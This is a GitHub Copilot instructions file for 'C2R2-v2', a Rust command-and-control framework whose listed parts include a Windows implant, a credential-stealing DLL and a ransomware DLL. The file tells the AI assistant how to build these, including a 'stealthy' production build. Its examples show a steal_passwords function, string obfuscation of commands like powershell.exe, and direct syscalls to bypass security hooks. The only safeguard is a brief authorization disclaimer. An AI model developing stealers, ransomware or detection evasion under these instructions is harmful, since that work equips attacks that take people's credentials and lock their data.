# Copilot Instructions for C2R2-v2

This document provides guidance for GitHub Copilot when working with the C2R2-v2 repository.

## Project Overview

C2R2-v2 (Command & Control Rust Reloaded) is a modular offensive security framework written entirely in Rust. It is designed for authorized penetration testing and red team operations only.

**⚠️ LEGAL DISCLAIMER**: This tool is for educational and authorized security testing purposes only. Never use it on systems without explicit written authorization.

## Project Structure

```
C2R2-v2/
├── agent/           # Windows agent (implant) - targets x86_64-pc-windows-gnu
├── c2r2-server/     # C2 server - runs on Linux
├── builder/         # Agent builder tool and module encryption
├── stealer-dll/     # Credential stealing module (DLL)
├── ransomware-dll/  # Ransomware module (DLL)
├── docs/            # Documentation
└── tools/           # Additional utilities
```

## Build and Test Commands

### Build All Components

```bash
# Build entire workspace
cargo build --workspace

# Build release versions
cargo build --release -p c2r2-server -p builder

# Build Windows-specific components (agent, stealer, ransomware)
cargo build --release --target x86_64-pc-windows-gnu -p agent
cargo build --release --target x86_64-pc-windows-gnu -p stealer-dll
cargo build --release --target x86_64-pc-windows-gnu -p ransomware-dll
```

### Docker Build (Recommended)

```bash
# Quick build with Docker
./docker-build.sh --ip 192.168.1.10 --port 4444

# Production build (stealthy)
./docker-build.sh --ip 192.168.1.10 --production
```

### Testing

```bash
# Run all tests
cargo test --workspace

# Run specific component tests
cargo test -p agent
cargo test -p c2r2-server

# Run with output
cargo test -- --nocapture
```

### Code Quality

```bash
# Format code
cargo fmt --all

# Check formatting
cargo fmt --check --all

# Run clippy linter
cargo clippy --workspace -- -D warnings
```

## Coding Standards

### Rust Style

- Follow the [Rust Style Guide](https://doc.rust-lang.org/nightly/style-guide/)
- Use `cargo fmt` before committing
- Address all `cargo clippy` warnings

### Documentation

- All public items must have doc comments
- Use `///` for item documentation
- Use `//!` for module-level documentation
- Include examples in doc comments where appropriate

```rust
/// Connects to the C2 server and initiates beacon loop.
///
/// # Arguments
///
/// * `address` - Server address in format "host:port"
///
/// # Returns
///
/// * `Ok(())` - Successfully connected
/// * `Err(BeaconError)` - Connection failed
pub fn connect(address: &str) -> Result<(), BeaconError> {
    // Implementation
}
```

### Error Handling

- Use `Result` types for fallible operations
- Never use `.unwrap()` in production code - use `?` operator or proper error handling
- Define custom error types for each module

```rust
// Good
pub fn steal_passwords() -> Result<Vec<Credential>, StealerError> {
    let db = open_database()?;
    let creds = query_passwords(&db)?;
    Ok(creds)
}

// Bad - avoid unwrap
pub fn steal_passwords() -> Vec<Credential> {
    let db = open_database().unwrap();  // DON'T DO THIS
    query_passwords(&db).unwrap()
}
```

### Commit Messages

Follow conventional commits format:

```
<type>(<scope>): <subject>

<body>

<footer>
```

Types: `feat`, `fix`, `docs`, `style`, `refactor`, `perf`, `test`, `chore`

Examples:
- `feat(agent): add DNS beacon support`
- `fix(stealer): handle locked Firefox database`
- `docs: update installation guide`

## Security Considerations

### No Secrets in Code

Never hardcode secrets, API keys, or sensitive configuration:

```rust
// Bad
const API_KEY: &str = "sk-1234567890abcdef";

// Good - load from environment or config
let api_key = env::var("API_KEY")?;
```

### Input Validation

Always validate input parameters:

```rust
pub fn set_beacon_interval(interval: u64) -> Result<(), ConfigError> {
    if interval < 10 || interval > 3600 {
        return Err(ConfigError::InvalidInterval);
    }
    Ok(())
}
```

### String Obfuscation

Use compile-time string encryption for sensitive strings:

```rust
use obfstr::obfstr;

let cmd = obfstr!("whoami");
let powershell = obfstr!("powershell.exe");
```

### Memory Safety

- Rust's ownership system provides memory safety by default
- Use `unsafe` blocks only when absolutely necessary
- Document all `unsafe` code with safety comments

## Component-Specific Guidelines

### Agent Development

- Target: `x86_64-pc-windows-gnu`
- Use direct syscalls where possible to bypass API hooks
- Implement proper beacon timing with jitter
- Keep binary size minimal (target ~60KB)

### Server Development

- Uses async Tokio runtime
- Multi-client support required
- Implement structured logging with `tracing`
- TLS 1.3 for all communications

### Module Development

Modules are DLLs loaded on-demand by the agent:

```rust
#![allow(non_snake_case)]

#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    0  // Return 0 on success
}

#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    // Implementation
}

#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}
```

## Dependencies

### Prerequisites

- Rust 1.70+ (`rustup`)
- MinGW-w64 for cross-compilation (`apt install mingw-w64`)
- Windows target (`rustup target add x86_64-pc-windows-gnu`)

### Adding Dependencies

- Minimize external dependencies to reduce binary size
- Use `cargo audit` to check for security vulnerabilities
- Prefer well-maintained crates with good security track records

## Testing Guidelines

- Write unit tests for new functionality
- Use `#[cfg(test)]` for test modules
- Integration tests go in `tests/` directory
- Test security-sensitive code paths thoroughly

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_beacon_jitter_calculation() {
        let config = BeaconConfig {
            interval: 60,       // Base interval: 60 seconds
            jitter_percent: 30, // Jitter: ±30%
        };
        
        let sleep = calculate_sleep_duration(&config);
        let secs = sleep.as_secs();
        // Expected range: 60 ± 30% = 42 to 78 seconds
        assert!(secs >= 42 && secs <= 78);
    }
}
```

## Pull Request Guidelines

1. Create feature branches from `develop`
2. Follow commit message conventions
3. Ensure all tests pass
4. Run `cargo fmt` and `cargo clippy`
5. Update documentation if needed
6. Request review from maintainers

## Additional Resources

- [Architecture Guide](docs/ARCHITECTURE.md)
- [Development Guide](docs/DEVELOPMENT.md)
- [Security Guide](docs/SECURITY.md)
- [Contributing Guidelines](docs/CONTRIBUTING.md)
- [Usage Guide](docs/USAGE.md)
